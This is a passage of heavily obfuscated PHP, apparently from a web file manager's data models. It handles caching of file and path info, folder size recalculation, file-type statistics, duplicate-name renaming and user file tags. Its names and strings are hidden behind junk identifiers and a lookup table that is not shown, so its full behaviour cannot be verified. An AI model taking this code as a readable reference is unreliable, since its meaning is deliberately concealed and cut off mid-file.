_get(self::$cacheFileInfo, $˜§¸À“Ù); if ($ş¡ÌÜû‰) { return $ş¡ÌÜû‰; } $îñƒ¹¤‹ = Model($öõØ[568])->fileInfo($´¸©æ“¼[$öõØ[565]]); if ($îñƒ¹¤‹) { $îñƒ¹¤‹[$öõØ[32]] = $´¸©æ“¼[$öõØ[32]]; } self::$cacheFileInfo[$˜§¸À“Ù] = $îñƒ¹¤‹; return $îñƒ¹¤‹; } private function folderChildrenNumber($Ü…·ŒÂ­) { $¯–”äÔ° =& $_SERVER[”øäÃÍª]; $‰ÑÌ¦Úã = $this->sourceInfo($Ü…·ŒÂ­); $å–òã¥ = array($¯–”äÔ°[682] => array($¯–”äÔ°[643], $‰ÑÌ¦Úã[$¯–”äÔ°[612]] . $Ü…·ŒÂ­ . $¯–”äÔ°[644]), $¯–”äÔ°[679] => $‰ÑÌ¦Úã[$¯–”äÔ°[597]], $¯–”äÔ°[527] => intval($‰ÑÌ¦Úã[$¯–”äÔ°[528]]), $¯–”äÔ°[676] => 1); $ÅèŒ­ô“ = $this->where($å–òã¥)->count(); $ËÒïÅóˆ = $this->where($å–òã¥)->where(array($¯–”äÔ°[676] => 0))->count(); return array($¯–”äÔ°[83] => $ËÒïÅóˆ, $¯–”äÔ°[84] => $ÅèŒ­ô“); } public function pathInfo($åùò–ãØ, $ö‡Æ¾Ù = false) { $•ûÔ‰ =& $_SERVER[”øäÃÍª]; $ö‡Æ¾Ù = !1; $åùò–ãØ = intval($åùò–ãØ); if (!$åùò–ãØ) { return !1; } $–ÛåÖ¼ˆ = $•ûÔ‰[556] . intval($ö‡Æ¾Ù) . $•ûÔ‰[476] . $åùò–ãØ; $€Õ”Û¹á = _get(self::$cachePathInfo, $–ÛåÖ¼ˆ); if ($€Õ”Û¹á) { return $€Õ”Û¹á; } $ƒàÛ—Šõ = $this->sourceInfo($åùò–ãØ); if (!$ƒàÛ—Šõ) { return !1; } $ƒàÛ—Šõ = $this->_listDataApplyItem($ƒàÛ—Šõ, $ö‡Æ¾Ù); self::$cachePathInfo[$–ÛåÖ¼ˆ] = $ƒàÛ—Šõ; return $ƒàÛ—Šõ; } public static $cachePathInfoMore = array(); public function pathInfoMore($´ë˜Ÿ“) { $ ¯¡ŠíË =& $_SERVER[”øäÃÍª]; $‡î³ÔÆè = _get(self::$cachePathInfoMore, $´ë˜Ÿ“); if ($‡î³ÔÆè) { return $‡î³ÔÆè; } $í”Ù‹ş¾ = $this->pathInfo($´ë˜Ÿ“); if (!$í”Ù‹ş¾) { return !1; } if ($í”Ù‹ş¾[$ ¯¡ŠíË[508]] == $ ¯¡ŠíË[91]) { $í”Ù‹ş¾[$ ¯¡ŠíË[82]] = $this->folderChildrenNumber($´ë˜Ÿ“); } self::$cachePathInfoMore[$´ë˜Ÿ“] = $í”Ù‹ş¾; return $í”Ù‹ş¾; } public function sourceInfo($ßöÌŒä‚) { $œåç®ú‚ =& $_SERVER[”øäÃÍª]; if (!$ßöÌŒä‚) { return array(); } $ßöÌŒä‚ = intval($ßöÌŒä‚); $¢º‡çã‡ = $œåç®ú‚[555] . $ßöÌŒä‚; $äÊâá‹ = _get(self::$cacheSourceInfo, $¢º‡çã‡); if ($äÊâá‹) { return $äÊâá‹; } $š¡ŠÁ´° = $this->where(array($œåç®ú‚[191] => $ßöÌŒä‚))->find(); self::$cacheSourceInfo[$¢º‡çã‡] = $š¡ŠÁ´°; return self::$cacheSourceInfo[$¢º‡çã‡]; } public function sourceCacheClear($»™ÏÙ×¦ = false) { self::cacheClear($»™ÏÙ×¦); } public static function cacheClear($Î›áƒñ = false) { $öèËçá« =& $_SERVER[”øäÃÍª]; if ($Î›áƒñ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$öèËçá«[555] . $Î›áƒñ]); unset(self::$cachePathInfoMore[$Î›áƒñ]); unset(self::$cachePathInfo[$öèËçá«[2454] . $Î›áƒñ]); unset(self::$cachePathInfo[$öèËçá«[2455] . $Î›áƒñ]); } public function metaSet($ğ‚ÎÚ, $êŞƒÔĞá = null, $’ñÒ¯– = null) { $”Š¨ßİ = parent::metaSet($ğ‚ÎÚ, $êŞƒÔĞá, $’ñÒ¯–); if ($”Š¨ßİ) { $this->sourceCacheClear($ğ‚ÎÚ); } return $”Š¨ßİ; } public function pathInfoByPath($ÏˆØ„Ô¡, $ÒùÖ”) { $Ûòö•Ô¹ =& $_SERVER[”øäÃÍª]; $”ëÊ¾¦æ = !$ÒùÖ” ? array() : explode($Ûòö•Ô¹[8], trim($ÒùÖ”, $Ûòö•Ô¹[8])); $”ı¼±Áë = intval($ÏˆØ„Ô¡); foreach ($”ëÊ¾¦æ as $Ë·Œå†ˆ) { $»°°¥—å = array($Ûòö•Ô¹[190] => $”ı¼±Áë, $Ûòö•Ô¹[32] => $Ë·Œå†ˆ); $˜¢†×í— = $this->field($Ûòö•Ô¹[2456])->where($»°°¥—å)->select(); if (!$˜¢†×í—) { return !1; } $˜¢†×í— = array_sort_by($˜¢†×í—, $Ûòö•Ô¹[528]); $”ı¼±Áë = intval($˜¢†×í—[0][$Ûòö•Ô¹[191]]); } $İ‹±²‡ü = $this->sourceInfo($”ı¼±Áë); $this->pathInfoFilter($İ‹±²‡ü); return $İ‹±²‡ü; } protected function updateModifyTime($íÂÇä¨©) { $é‘©ì•Š =& $_SERVER[”øäÃÍª]; $Çì°éÛñ = KodUser::id(); if (!$íÂÇä¨©) { return; } if (!is_array($íÂÇä¨©)) { $íÂÇä¨© = array($íÂÇä¨©); } foreach ($íÂÇä¨© as $¡Áº¢¦Ë => $Æ†ØÛÏ) { $íÂÇä¨©[$¡Áº¢¦Ë] = intval($Æ†ØÛÏ); $this->sourceCacheClear($Æ†ØÛÏ); } $ŠûÊ¯µñ = array($é‘©ì•Š[191] => array($é‘©ì•Š[7], $íÂÇä¨©)); $šı¨¾µ = array($é‘©ì•Š[681] => $Çì°éÛñ, $é‘©ì•Š[521] => time()); $this->where($ŠûÊ¯µñ)->save($šı¨¾µ); } public function folderSizeReset($’‘‘¦…ª, $¼ÅÂ±µ· = false) { $ëš†½ëË =& $_SERVER[”øäÃÍª]; if ($this->statusIgnoreResetSpace) { return; } if (!$’‘‘¦…ª) { return; } $÷à÷»ºµ = $this->sourceInfo($’‘‘¦…ª); $íó‡æàÂ = $ëš†½ëË[2457] . $’‘‘¦…ª; if (!$÷à÷»ºµ || !$÷à÷»ºµ[$ëš†½ëË[191]]) { return; } CacheLock::lock($íó‡æàÂ, 20); if ($¼ÅÂ±µ· === !1) { $this->sourceCacheClear($’‘‘¦…ª); $÷à÷»ºµ = $this->sourceInfo($’‘‘¦…ª); $ªÛ¸Ğ©¢ = array($ëš†½ëË[500] => $’‘‘¦…ª, $ëš†½ëË[527] => 0); $¥®§ü½Ç = $this->where($ªÛ¸Ğ©¢)->sum($ëš†½ëË[79]); $¼ÅÂ±µ· = intval($¥®§ü½Ç) - intval($÷à÷»ºµ[$ëš†½ëË[79]]); } if ($¼ÅÂ±µ· == 0) { return CacheLock::unlock($íó‡æàÂ); } $‹«Îªú— = $this->parentLevelArray($÷à÷»ºµ[$ëš†½ëË[612]]); if (!$‹«Îªú—) { $‹«Îªú— = array(); } $‹«Îªú—[] = $÷à÷»ºµ[$ëš†½ëË[191]]; $ªÛ¸Ğ©¢ = array($ëš†½ëË[191] => array($ëš†½ëË[515], $‹«Îªú—)); if ($¼ÅÂ±µ· < 0) { $ªÛ¸Ğ©¢[$ëš†½ëË[79]] = array($ëš†½ëË[1137], abs($¼ÅÂ±µ·)); } $this->where($ªÛ¸Ğ©¢)->setAdd($ëš†½ëË[79], $¼ÅÂ±µ·); CacheLock::unlock($íó‡æàÂ); if (!$÷à÷»ºµ[$ëš†½ëË[597]] || $÷à÷»ºµ[$ëš†½ëË[597]] == $ëš†½ëË[228]) { return; } $ğğ›ÖÁ = $ëš†½ëË[2458] . $÷à÷»ºµ[$ëš†½ëË[188]] . $ëš†½ëË[4] . $÷à÷»ºµ[$ëš†½ëË[597]]; $äÙÁÉÁ½ = array($÷à÷»ºµ[$ëš†½ëË[188]], $÷à÷»ºµ[$ëš†½ëË[597]]); TaskRun::timeLimitCall($ğğ›ÖÁ, $ëš†½ëË[2459], $äÙÁÉÁ½, 1.5); } public function folderSizeResetChildren($Ë°ı¢¿) { $¦î¹×Åˆ =& $_SERVER[”øäÃÍª]; $this->sourceCacheClear($Ë°ı¢¿); $È±Î¶® = $this->sourceInfo($Ë°ı¢¿); if (!$È±Î¶®) { return; } $ÆèşÉŸÅ = array($¦î¹×Åˆ[676] => 1, $¦î¹×Åˆ[679] => $È±Î¶®[$¦î¹×Åˆ[597]], $¦î¹×Åˆ[682] => array($¦î¹×Åˆ[643], $È±Î¶®[$¦î¹×Åˆ[612]] . $Ë°ı¢¿ . $¦î¹×Åˆ[644])); $´Ë±„İü = $¦î¹×Åˆ[2460]; $¾§·îıç = $this->field($´Ë±„İü)->where($ÆèşÉŸÅ)->select(); $ÆèşÉŸÅ[$¦î¹×Åˆ[508]] = 0; $’ê«‚Á = $this->field($´Ë±„İü)->where($ÆèşÉŸÅ)->select(); if (!$’ê«‚Á) { return; } $¾§·îıç[] = $È±Î¶®; $¾§·îıç = array_to_keyvalue($¾§·îıç, $¦î¹×Åˆ[191]); foreach ($¾§·îıç as $£Õ‘õå => $­¯ıÑó) { $¾§·îıç[$£Õ‘õå][$¦î¹×Åˆ[2461]] = $¾§·îıç[$£Õ‘õå][$¦î¹×Åˆ[79]]; $¾§·îıç[$£Õ‘õå][$¦î¹×Åˆ[79]] = 0; } foreach ($’ê«‚Á as $­¯ıÑó) { $í“ÑÎÆ = $­¯ıÑó[$¦î¹×Åˆ[190]] . $¦î¹×Åˆ[12]; if (!isset($¾§·îıç[$í“ÑÎÆ])) { continue; } if ($­¯ıÑó[$¦î¹×Åˆ[528]] == $¾§·îıç[$í“ÑÎÆ][$¦î¹×Åˆ[528]]) { $¾§·îıç[$í“ÑÎÆ][$¦î¹×Åˆ[79]] += $­¯ıÑó[$¦î¹×Åˆ[79]]; } } foreach ($¾§·îıç as $­¯ıÑó) { $íú§¯·÷ = $this->parentLevelArray($­¯ıÑó[$¦î¹×Åˆ[612]]); foreach ($íú§¯·÷ as $í“ÑÎÆ) { $í“ÑÎÆ = $í“ÑÎÆ . $¦î¹×Åˆ[12]; if (!isset($¾§·îıç[$í“ÑÎÆ])) { continue; } if ($­¯ıÑó[$¦î¹×Åˆ[528]] == $¾§·îıç[$í“ÑÎÆ][$¦î¹×Åˆ[528]]) { $¾§·îıç[$í“ÑÎÆ][$¦î¹×Åˆ[79]] += $­¯ıÑó[$¦î¹×Åˆ[79]]; } } } $„¸ğê³ = array(); foreach ($¾§·îıç as $­¯ıÑó) { if ($­¯ıÑó[$¦î¹×Åˆ[79]] == $­¯ıÑó[$¦î¹×Åˆ[2461]]) { continue; } $„¸ğê³[] = array($¦î¹×Åˆ[191], $­¯ıÑó[$¦î¹×Åˆ[191]], $¦î¹×Åˆ[79], $­¯ıÑó[$¦î¹×Åˆ[79]]); } $this->saveAll($„¸ğê³); } public function userSpaceReset($İèèÕê = false) { $‹¦ş‘Î† =& $_SERVER[”øäÃÍª]; $›ıÜÛæÄ = $this->where(array($‹¦ş‘Î†[188] => self::TYPE_USER, $‹¦ş‘Î†[597] => $İèèÕê, $‹¦ş‘Î†[508] => 0))->sum($‹¦ş‘Î†[79]); $›ıÜÛæÄ = !$›ıÜÛæÄ || $›ıÜÛæÄ <= 0 ? 0 : $›ıÜÛæÄ; Model($‹¦ş‘Î†[605])->userEdit($İèèÕê, array($‹¦ş‘Î†[2129] => $›ıÜÛæÄ)); } public function targetSpaceUpdate($ƒĞé‡ö, $ƒÁÔ’ıı) { $Š¦ßÛ¼ =& $_SERVER[”øäÃÍª]; if (!$ƒÁÔ’ıı) { return; } if (!in_array($ƒĞé‡ö, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ÎîÏÖ±ú = $this->targetSpaceSize($ƒĞé‡ö, $ƒÁÔ’ıı); if ($ƒĞé‡ö == self::TYPE_USER) { Model($Š¦ßÛ¼[605])->userEdit($ƒÁÔ’ıı, array($Š¦ßÛ¼[2129] => $ÎîÏÖ±ú)); } else { if ($ƒĞé‡ö == self::TYPE_GROUP) { Model($Š¦ßÛ¼[613])->groupEdit($ƒÁÔ’ıı, array($Š¦ßÛ¼[2129] => $ÎîÏÖ±ú)); } } } public function targetSpaceSize($‹€ü“¶ì, $¨Æ¬“È¶) { $¬ÒÃ¤š =& $_SERVER[”øäÃÍª]; $Î€µ²å = 0; $‰Ó’‚¢Ğ = $this->targetSourceRoot($‹€ü“¶ì, $¨Æ¬“È¶, !0); foreach ($‰Ó’‚¢Ğ as $–¬İÑ–¶) { if (!$–¬İÑ–¶) { continue; } $Î€µ²å += floatval($–¬İÑ–¶[$¬ÒÃ¤š[79]]); $Î’ÂğĞ© = array($¬ÒÃ¤š[682] => array($¬ÒÃ¤š[643], $¬ÒÃ¤š[621] . $–¬İÑ–¶[$¬ÒÃ¤š[191]] . $¬ÒÃ¤š[644])); $°Ì™şÈŸ = Model($¬ÒÃ¤š[526])->field($¬ÒÃ¤š[514])->where($Î’ÂğĞ©)->select(); $°Ì™şÈŸ = array_to_keyvalue($°Ì™şÈŸ, $¬ÒÃ¤š[12], $¬ÒÃ¤š[191]); $°Ì™şÈŸ = array_unique(array_filter($°Ì™şÈŸ)); if ($°Ì™şÈŸ) { $Î’ÂğĞ© = array($¬ÒÃ¤š[514] => array($¬ÒÃ¤š[515], $°Ì™şÈŸ)); $Î€µ²å += floatval($this->where($Î’ÂğĞ©)->sum($¬ÒÃ¤š[79])); } } $Î€µ²å = !$Î€µ²å || $Î€µ²å <= 0 ? 0 : $Î€µ²å; return $Î€µ²å; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ÙÆîÌ©›) { return $this->fileTypeProfile($ÙÆîÌ©›, SourceModel::TYPE_USER); } public function groupFileTypeProfile($™œÎƒë–) { return $this->fileTypeProfile($™œÎƒë–, SourceModel::TYPE_GROUP); } private function fileTypeProfile($úÚ´•, $¼ÍÜíµŞ) { $ıÂ£àš =& $_SERVER[”øäÃÍª]; $Äî²»ğÅ = $ıÂ£àš[2462] . $úÚ´• . $ıÂ£àš[11] . $¼ÍÜíµŞ; $ó»ã† = Cache::get($Äî²»ğÅ); if ($ó»ã†) { return $ó»ã†; } $èÚìÀ®¶ = array($ıÂ£àš[676] => 0); if ($úÚ´• != !1) { $èÚìÀ®¶[$ıÂ£àš[597]] = $úÚ´•; $èÚìÀ®¶[$ıÂ£àš[188]] = $¼ÍÜíµŞ; } $·Ø¦€ÒÄ = array(); $ ’¥ÃÆÌ = $this->field(array($ıÂ£àš[2390] => $ıÂ£àš[2096], $ıÂ£àš[2463] => $ıÂ£àš[79]))->where($èÚìÀ®¶)->find(); $·Ø¦€ÒÄ[$ıÂ£àš[2464]] = array($ıÂ£àš[2465] => LNG($ıÂ£àš[2464]), $ıÂ£àš[2466] => intval($ ’¥ÃÆÌ[$ıÂ£àš[2096]]), $ıÂ£àš[648] => intval($ ’¥ÃÆÌ[$ıÂ£àš[79]])); $°¡Á¤º = KodIO::fileTypeList(); foreach ($°¡Á¤º as $¹á‚µÙ => $ò¬ã÷ ‘) { $èÚìÀ®¶[$ıÂ£àš[509]] = $this->fileTypeWhere($¹á‚µÙ); $ ’¥ÃÆÌ = $this->field(array($ıÂ£àš[2390] => $ıÂ£àš[2096], $ıÂ£àš[2463] => $ıÂ£àš[79]))->where($èÚìÀ®¶)->find(); $·Ø¦€ÒÄ[$¹á‚µÙ] = array($ıÂ£àš[2465] => $ò¬ã÷ ‘[$ıÂ£àš[32]], $ıÂ£àš[2466] => intval($ ’¥ÃÆÌ[$ıÂ£àš[2096]]), $ıÂ£àš[648] => intval($ ’¥ÃÆÌ[$ıÂ£àš[79]])); } Cache::set($Äî²»ğÅ, $·Ø¦€ÒÄ, 1200); return $·Ø¦€ÒÄ; } public function fileNameExist($á¬òŸ£«, $«’À×¦·) { $òÀº§¸È =& $_SERVER[”øäÃÍª]; $±ÄºİõÒ = $this->field($òÀº§¸È[2467])->where(array($òÀº§¸È[190] => $á¬òŸ£«, $òÀº§¸È[32] => $«’À×¦·, $òÀº§¸È[528] => 0))->find(); return is_array($±ÄºİõÒ) ? $±ÄºİõÒ[$òÀº§¸È[191]] : !1; } public function childList($£éÏœÌ) { $¹„ƒÔ«ä =& $_SERVER[”øäÃÍª]; $ù†ì—î§ = $¹„ƒÔ«ä[2439] . $£éÏœÌ; if (isset(self::$cacheChildList[$ù†ì—î§])) { return self::$cacheChildList[$ù†ì—î§]; } $ü™Ç‹òÂ = array($¹„ƒÔ«ä[190] => intval($£éÏœÌ), $¹„ƒÔ«ä[528] => 0); $Ì¤óÔ‰¸ = $this->where($ü™Ç‹òÂ)->select(); $Ì¤óÔ‰¸ = $Ì¤óÔ‰¸ ? $Ì¤óÔ‰¸ : array(); self::$cacheChildList[$ù†ì—î§] = $Ì¤óÔ‰¸; foreach ($Ì¤óÔ‰¸ as $‚ÔŒÎÑÛ) { $ù†ì—î§ = $¹„ƒÔ«ä[555] . $‚ÔŒÎÑÛ[$¹„ƒÔ«ä[191]]; self::$cacheSourceInfo[$ù†ì—î§] = $‚ÔŒÎÑÛ; } return $Ì¤óÔ‰¸; } public function fileNameAuto($¦ùæ£–Ä, $êÍ’—ÕÂ, $ú¡Œ´Úš = REPEAT_RENAME, $£çÌ¸ = false) { $üœò°µ‚ =& $_SERVER[”øäÃÍª]; $·á ¸Ğ£ = get_path_ext($êÍ’—ÕÂ); $ï›‹†òî = $·á ¸Ğ£ ? get_path_ext_name($êÍ’—ÕÂ) . $üœò°µ‚[2468] . $·á ¸Ğ£ : $êÍ’—ÕÂ . $üœò°µ‚[474]; $è¥ËñËö = array($üœò°µ‚[190] => $¦ùæ£–Ä, $üœò°µ‚[528] => 0, $üœò°µ‚[32] => array($üœò°µ‚[473], $ï›‹†òî)); $ƒ±ç§Ó‘ = $this->field($üœò°µ‚[32])->where($è¥ËñËö)->select(); $¨õ½÷”ö = array_to_keyvalue($ƒ±ç§Ó‘, $üœò°µ‚[12], $üœò°µ‚[32]); return $this->fileNameAutoGet($¨õ½÷”ö, $êÍ’—ÕÂ, $ú¡Œ´Úš, $£çÌ¸); } public function fileNameAutoGet($ˆ­Ïıø¥, $²Ò“ú×Ú, $î’Ë£Âï, $ÆŒ§ÁŒ) { $Àß¹™¿É =& $_SERVER[”øäÃÍª]; if ($î’Ë£Âï == REPEAT_REPLACE || !$ˆ­Ïıø¥ || !in_array_not_case($²Ò“ú×Ú, $ˆ­Ïıø¥) || $ÆŒ§ÁŒ && $î’Ë£Âï != REPEAT_RENAME_FOLDER) { return $²Ò“ú×Ú; } if ($î’Ë£Âï == REPEAT_SKIP) { return !1; } $ÏÊ¬’ĞÃ = $Àß¹™¿É[10] . get_path_ext($²Ò“ú×Ú); $ÏÊ¬’ĞÃ = $ÏÊ¬’ĞÃ == $Àß¹™¿É[10] || $ÆŒ§ÁŒ ? $Àß¹™¿É[12] : $ÏÊ¬’ĞÃ; for ($Ûç”ŠˆÃ = 1; $Ûç”ŠˆÃ <= count($ˆ­Ïıø¥) + 1; $Ûç”ŠˆÃ++) { $í«ÃÈè = substr($²Ò“ú×Ú, 0, strlen($²Ò“ú×Ú) - strlen($ÏÊ¬’ĞÃ)); $œÓ›„™… = $í«ÃÈè . "\x28{$Ûç”ŠˆÃ}\x29{$ÏÊ¬’ĞÃ}"; if (!in_array_not_case($œÓ›„™…, $ˆ­Ïıø¥)) { return $œÓ›„™…; } } } } goto D•ÄÓ ¹­; añ«‡ê Æƒ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($§ä¥éŸ¹) { $ïæ·¹» =& $_SERVER[”øäÃÍª]; return array($ïæ·¹»[2252] => array($ïæ·¹»[2680] . USER_ID, $ïæ·¹»[2253])); } protected function ___listData() { $¼€‘›†º =& $_SERVER[”øäÃÍª]; $¹œ»²ùı = array($¼€‘›†º[1925] => USER_ID, $¼€‘›†º[581] => array($¼€‘›†º[2256], 0)); $™‰Š„ÔÎ = $¼€‘›†º[2681]; $‰ÈÖó¹¤ = $this->field($™‰Š„ÔÎ)->where($¹œ»²ùı)->order($¼€‘›†º[2258])->select(); return $‰ÈÖó¹¤ ? $‰ÈÖó¹¤ : array(); } protected function addToTag($ğõº™ÃÊ, $Ì¤‹öÔß) { $Ñ¾àúº´ =& $_SERVER[”øäÃÍª]; if (!Model($Ñ¾àúº´[2407])->listData($Ì¤‹öÔß)) { return !1; } if (is_numeric($ğõº™ÃÊ)) { $Ëñ–ÀÆÙ = Model($Ñ¾àúº´[941])->pathInfo($ğõº™ÃÊ); if (!$Ëñ–ÀÆÙ) { return !1; } } else { $Ëñ–ÀÆÙ = IO::infoSimple($ğõº™ÃÊ); if (!$Ëñ–ÀÆÙ) { return !1; } $öğ÷Š¯Û = $Ëñ–ÀÆÙ[$Ñ¾àúº´[32]]; $Ô­ä‚²¼ = $Ëñ–ÀÆÙ[$Ñ¾àúº´[33]]; if (isset($Ëñ–ÀÆÙ[$Ñ¾àúº´[508]])) { $Ô­ä‚²¼ = $Ëñ–ÀÆÙ[$Ñ¾àúº´[508]] == $Ñ¾àúº´[91] ? $Ñ¾àúº´[78] : $Ñ¾àúº´[230]; } } $â©—ûã¿ = array($Ñ¾àúº´[1925] => USER_ID, $Ñ¾àúº´[581] => $Ì¤‹öÔß, $Ñ¾àúº´[518] => $ğõº™ÃÊ, $Ñ¾àúº´[519] => $Ô­ä‚²¼ ? $Ô­ä‚²¼ : $Ñ¾àúº´[513], $Ñ¾àúº´[517] => $öğ÷Š¯Û ? $öğ÷Š¯Û : $Ñ¾àúº´[12], $Ñ¾àúº´[2144] => 0); if ($this->where($â©—ûã¿)->find()) { return !1; } return $this->add($â©—ûã¿); } protected function removeFromTag($œÈ¸Ä„Ì, $ñ§¼ú¡) { $Œ„˜İÂÇ =& $_SERVER[”øäÃÍª]; if (!Model($Œ„˜İÂÇ[2407])->listData($ñ§¼ú¡)) { return !1; } if (is_array($œÈ¸Ä„Ì)) { $œÈ¸Ä„Ì = array($Œ„˜İÂÇ[7], $œÈ¸Ä„Ì); } $şË¦Ñ¬¬ = array($Œ„˜İÂÇ[1925] => USER_ID, $Œ„˜İÂÇ[581] => $ñ§¼ú¡, $Œ„˜İÂÇ[518] => $œÈ¸Ä„Ì); return $this->where($şË¦Ñ¬¬)->delete(); } protected function removeByTag($àìÇãğ) { $ãƒ››› =& $_SERVER[”øäÃÍª]; if (!$àìÇãğ) { return !1; } $öı–•á = array($ãƒ›››[1925] => USER_ID, $ãƒ›››[581] => $àìÇãğ); return $this->where($öı–•á)->delete(); } protected function removeBySource($›«Á„) { $¾ÖÑñÏ€ =& $_SERVER[”øäÃÍª]; if (is_array($›«Á„)) { $›«Á„ = array($¾ÖÑñÏ€[7], $›«Á„); } $Á†ñÍ¤­ = array($¾ÖÑñÏ€[1925] => USER_ID, $¾ÖÑñÏ€[581] => array($¾ÖÑñÏ€[1136], 0), $¾ÖÑñÏ€[518] => $›«Á„); return $this->where($Á†ñÍ¤­)->delete(); } }